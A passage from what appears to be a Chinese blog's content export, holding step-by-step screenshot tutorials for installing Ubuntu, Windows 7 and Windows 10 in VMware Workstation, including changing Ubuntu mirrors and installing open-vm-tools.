src="https://img-blog.csdnimg.cn/6505a58a3c7445a98d83f3d88f3445e2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>进入之后，下拉选中 中文简体，再点 Ubuntu 安装</strong></p><p><img src="https://img-blog.csdnimg.cn/71c5bfe0f2cf4043880bc2d23f49d120.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>再双击 chinese。这里因为 Ubuntu 系统显示器大小不对，下面的界面显示不出来，我们在下一步先来修改它的显示器大小</strong></p><p><img src="https://img-blog.csdnimg.cn/a7c0efc0feee49b89cdd28a77754f474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>到这里后，本来右下箭头所指地方有 继续 按钮，但是显示不出来，我们先关掉安装界面，退出安装</strong></p><p><img src="https://img-blog.csdnimg.cn/486d5b9fcf424ff3b06e4f323afd06d4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><img src="https://img-blog.csdnimg.cn/ccd40fcb398f4cfaa8e2211a3e8d6d87.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>等待… 然后进入如下页面，点击右上角倒三角形，再点击设置</strong></p><p><img src="https://img-blog.csdnimg.cn/f9c09dbd07d94ef281edd22019a8666d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>下拉找到显示器，点击分辨率</strong></p><p><img src="https://img-blog.csdnimg.cn/644578e4f11f4323a0da7313b5494c2e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>任意改为另一个，例如 1024x768，再点击应用</strong></p><p><img src="https://img-blog.csdnimg.cn/62a8f8990a2c4e2f8f8faaae3aaabed7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>选择保留更改</strong></p><p><img src="https://img-blog.csdnimg.cn/cd213e6ae18c4a7daca11d2000dbae29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>然后点击左上角图标，重新进入系统安装</strong></p><p><img src="https://img-blog.csdnimg.cn/b728beb894294d7d874d63fdafeed0c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>可以看到这时能显示继续的按钮，点击继续</strong></p><p><img src="https://img-blog.csdnimg.cn/66f2ba0be27c41bb88a53406331e912d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/1f7b55c37c8a47199da1c63e334fe077.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/fc6b2fecc13c4b0f92e58cc9ed55d600.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>点击现在安装</strong></p><p><img src="https://img-blog.csdnimg.cn/ac40c006372a47d5a54b18b59e4a00a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>再点击继续</strong></p><p><img src="https://img-blog.csdnimg.cn/ce93a89bedce414d8425a169f8b5e06d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>选择地区</strong><br>点中国所在范围<img src="https://img-blog.csdnimg.cn/385af46dc7584c989052481f68999394.png"></p><p><strong>自行填写以下信息</strong></p><p><img src="https://img-blog.csdnimg.cn/6273e1ec5fcb4a4087c80eb072cfadf3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>然后便进入安装等待界面</strong></p><p><img src="https://img-blog.csdnimg.cn/268da6e3306746c3b372e834f491fa8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>下载文件时间较长，可点击展开选择 skip，然后再等待一段时间…</strong></p><p><img src="https://img-blog.csdnimg.cn/027fdbbf1aef4ce093d536018b323157.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>安装完成，提示重启，点击重启</strong></p><p><img src="https://img-blog.csdnimg.cn/82c1b31768184c95872dc56f2de25ccd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>然后根据提示，进入系统，显示如下界面，即安装完成。</strong></p><p><img src="https://img-blog.csdnimg.cn/99ade9314d0e4cb29675e5d25f441348.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><h1 id="3-更改-Ubuntu-软件源"><a href="#3-更改-Ubuntu-软件源" class="headerlink" title="3 更改 Ubuntu 软件源"></a>3 更改 Ubuntu 软件源</h1><p><strong>配置系统的软件源，提高下载速度</strong><br><strong>先点左下角矩形网格，找到并打开 软件与更新</strong></p><p><img src="https://img-blog.csdnimg.cn/0c218cd4647b4aea933c06ba5a25aeed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>按图示修改</strong></p><p><img src="https://img-blog.csdnimg.cn/807db0c55df742d79737283df3fd49ce.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><img src="https://img-blog.csdnimg.cn/e97e749f40db4cab81869f7e94b181ba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>点击选择一个服务器，如第一个，再点选择服务器</strong></p><p><img src="https://img-blog.csdnimg.cn/76975f49cc304023a2888aef627b1cc7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>再点关闭</strong></p><p><img src="https://img-blog.csdnimg.cn/f796edc922c44ab1aea016d913294bc9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>点击重新载入，并等待</strong></p><p><img src="https://img-blog.csdnimg.cn/ade0755ba7df41d6af45224999c100fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>其中需输入密码，即之前自行设置的密码，此后有软件更新点击更新即可</strong><br><strong>到这里软件源更改完成。</strong></p><h1 id="4-Windows-与-Ubuntu-跨系统复制粘贴"><a href="#4-Windows-与-Ubuntu-跨系统复制粘贴" class="headerlink" title="4 Windows 与 Ubuntu 跨系统复制粘贴"></a>4 Windows 与 Ubuntu 跨系统复制粘贴</h1><p><strong>打开终端，手动输入以下命令，再重启 ubuntu 系统就可以了</strong><br><strong>即通过安装 VMtools 实现了 Windows 与 Ubuntu 跨系统复制粘贴，也实现了 Ubuntu 窗口自适应</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>参考：<a href="https://askubuntu.com/questions/691585/copy-paste-and-dragdrop-not-working-in-vmware-machine-with-ubuntu/824341#824341">Copy&#x2F;paste and drag&amp;drop not working</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows7的虚拟机安装</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Windows7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Windows7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>写在前面</p><hr><p><strong>0. 推荐直接在这里下载原生无广告镜像:</strong> <a href="https://msdn.itellyou.cn/?lang=zh-cn">https://msdn.itellyou.cn/?lang=zh-cn</a></p><p><strong>1. 打开 VMWare Workstation，点击创建新的虚拟机。</strong><img src="https://img-blog.csdnimg.cn/441d8dcaa6e440ebb9b2f764706cce40.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>2. 弹出的页面选择自定义，再点击下一步。</strong><img src="https://img-blog.csdnimg.cn/d0486ab101c44101b093ec3ff5ea542d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>3. 兼容性选择我是直接默认。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/dcb91bf247a24f56a3032cb8e1940173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>4. 选择稍后安装操作系统，点击下一步。</strong><img src="https://img-blog.csdnimg.cn/0d4c3c841e94475c87b41009e4a901c9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>5. 选择你想要安装系统对应的选项，这里我们装的是 windows7 的系统，所以选择 Microsoft Windows，点击下一步。</strong><img src="https://img-blog.csdnimg.cn/2c446ddca62e422ea39a23efd5205a30.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>6. 在你相对内存比较大的磁盘新建一个文件夹，当作镜像系统的安装路径。虚拟机 的名称喜欢就好。再下一步。</strong><img src="https://img-blog.csdnimg.cn/0a1df266eded4c41b16d4b4e2dab8a15.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>7. 固件类型直接默认 BIOS。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/6b2ca76fb3fd44909f402ae2d5efdc2f.png#pic_center"><br><strong>8. 分配给 Windows 7 的处理器个数，2 个应该足够。本蒟蒻电脑是四核的处理器。再点击下一步。</strong><img src="https://img-blog.csdnimg.cn/9c7c5058e7914f458965a4b069a7863c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>9. 接下来是给虚拟机分配内存，直接默认就好，后面还是可以改的，但是如果在这里想改的话，要注意右边框框的值应该是 4 的倍数。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/a2ed24b6a8c1468c9de244fbaf0afeaf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>10. 网络类型还是默认 NAT。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/164c4f4865fc441ea40d3b7ad640cc16.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>11. 这波继续默认，点击下一步。</strong>（整的我都不好意思了，一直默认）<img src="https://img-blog.csdnimg.cn/6e1c7b7af1794939b2c60d158fc0a198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>12. 磁盘类型选择 SCSI，IDE 只支持四块盘，而 SCSI 则更多。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/cb1a02e29e144a84912986afeddfea82.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>13. 这里我们创建新磁盘，点击下一步。</strong><img src="https://img-blog.csdnimg.cn/ef3a7f47a9504e30aaa5dc0990b7e45b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>14. 首先内存大小选择 160G，这里的 160G 并不是值直接给你整个 160G 的内存，而是指在你用这个操作系统的过程中，日积月累，能接受的最大内存，所以刚开始装好还是很小的。另外，下面的选项选 “存储为单个文件”。多个文件的选项是针对 FAT32 分区的，而正常 NTFS 分区选择单个文件。</strong><img src="https://img-blog.csdnimg.cn/1de6b91af69d4a959dccb577a1811515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>15. 接下来的界面是产生了一个虚拟硬盘，.vmdk 是虚拟硬盘文件后缀名。直接点击下一步。</strong><img src="https://img-blog.csdnimg.cn/07d16502fec0463b9cff0ad8f3728a40.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>16. 点击完成。到这里就相当于把硬件配置好了。</strong><img src="https://img-blog.csdnimg.cn/c40f18c7120948d79684b945c2e1c469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>17. 点击左侧设备栏里任一设备可进入如下图所示界面，对于用不到的设备（例如：USB 控制器、声卡、打印机）可以直接选中右下角移除。后期想要也可以右下角添加。</strong><img src="https://img-blog.csdnimg.cn/d04f1a5be8844ccd8cd3ea6ea40e9aa6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>18. 还是上面界面，点击光驱，再点击使用 ISO 映像文件，路径是下载 Windows 7 镜像文件的保存路径。再点击右下角的确定。</strong><img src="https://img-blog.csdnimg.cn/a2bb833d98a44a9bb1e697cfadee3c94.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>19. 我 TM 直接开机！直接下一步！直接点现在安装！</strong><img src="https://img-blog.csdnimg.cn/cf7a15cdfa1e446e9439111884a3bcec.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>20. 许可证点击接受直接下一步。</strong><img src="https://img-blog.csdnimg.cn/b26fee87b2f349febda51052476a4495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>21. 选择自定义安装，咱能听他默认摆布？</strong><img src="https://img-blog.csdnimg.cn/2ea4c0a370fd452fa9874f506e06c765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>22. 接下来千万别点下一步！点右下方驱动器选项，再点击新建，就是新建一个系统盘吧，做测试 40G 够了，点击应用。产生的 100M 的那个东西，因为一般的盘和操作系统都会加密保证安全，那个是用来存放加密解密程序的，不用管。点击下一步。</strong><img src="https://img-blog.csdnimg.cn/af8046298d6e40d29fead54a17202fc3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/9966c0ea55464268bc1313ef5f750e0e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>23. 很好，硬等… 接下来用户名和计算机名称我就不放截图了，看心情取名字呗。点击下一步。设置一下密码，再下一步。</strong></p><p><strong>24. 下图我选的是第二个，之后点击下一步。</strong><img src="https://img-blog.csdnimg.cn/d5a974df9816403c87bf3746e6577352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>25. 下图我选择的是工作网络。有一说一，从安全的角度来考虑，工作网络是最不安全的，因为它的好多接口都是打开的。</strong><img src="https://img-blog.csdnimg.cn/c17e6c955c4e41eba5f0331e8d6a5a90.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>26.OVER!!!</strong><img src="https://img-blog.csdnimg.cn/58bbc26f03e8458d9cb02a30600af49c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RobWhoaGg=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>最后大家不要忘了装 Windows Tools ! 怎么装详见我下一篇博客。</strong><br>下接 <a href="https://blog.csdn.net/dhmhhhh/article/details/119798462">Windows 7 镜像安装 Windows Tools 及一点常见问题（系统需要升级 SP1）</a><br>如果有需要的小伙伴，不要忘了新建一个永久磁盘哦！看这里：<a href="https://blog.csdn.net/dhmhhhh/article/details/119819645">给 VMWare Wrokstation 添加永久磁盘</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 虚拟机的安装教程</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Windows10%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Windows10%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><blockquote><p>VMware Workstation Pro 虚拟机安装 Windows 10 系统</p></blockquote><p><strong>0. 推荐直接在这里下载原生无广告镜像:</strong> <a href="https://msdn.itellyou.cn/?lang=zh-cn">https://msdn.itellyou.cn/?lang=zh-cn</a></p><ol><li>创建新的虚拟机。</li></ol><p><img src="https://s2.51cto.com/images/202203/680be55258489ba9c919201e9fe5eb3db01a0a.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="2"><li>选择自定义，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/81f0294744680878b51412d531a4d81ff66212.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="3"><li>默认就可可以，点击下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/a16db7d580c523a8cef3715eed9c4abfdfa8d2.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="4"><li>选择稍后安装操作系统，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/e54037f0786a2e4c35a64673018538152e1a7a.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="5"><li>选择 Microsoft Windows ，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/32ff5a816363206862b89977317b10fa36b96f.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="6"><li>根据自己的需求来更改虚拟机名称和存放位置。</li></ol><p><img src="https://s2.51cto.com/images/202203/3566f9893971f5c9a44043e66edd5444ffc1e3.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="7"><li>选择 BIOS，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/69b50334609ceb861f704874645de17cfbe26c.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="8"><li>核数根据自己需求来改，默认也可以。</li></ol><p><img src="https://s2.51cto.com/images/202203/0830c8148c376af54f684876bde9fdbf9f41d3.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="9"><li>选择 2G，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/63d73be3044ad4899bd624f63adb43a8d642da.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="10"><li>选择网络地址转换（NAT）.</li></ol><p><img src="https://s2.51cto.com/images/202203/25fb54635aa4ed8010280911b249c6a5420b13.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="11"><li>选择 LSI Logic SAS</li></ol><p><img src="https://s2.51cto.com/images/202203/f88dab750fdb08a0f09282e1ca3c27c1f3cc6d.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="12"><li>选择 SCSI.</li></ol><p><img src="https://s2.51cto.com/images/202203/f99a23612cc9537b1825198f18f3a61b740656.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="13"><li>选择创建新虚拟磁盘。</li></ol><p><img src="https://s2.51cto.com/images/202203/08c2abb406653b64b4c450b7105ea8a7bc28f6.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="14"><li>选择将虚拟磁盘存储为单个文件，磁盘大小跟据自己需求来改。</li></ol><p><img src="https://s2.51cto.com/images/202203/a4dc84280bd9a6e09f76362e8be34646a03c88.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="15"><li>默认，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/f5f172d98e7fd024c172023f3cb80b74858a95.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="16"><li>完成。</li></ol><p><img src="https://s2.51cto.com/images/202203/05ceb9325310e51c476863a668f2699e22dbbf.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol 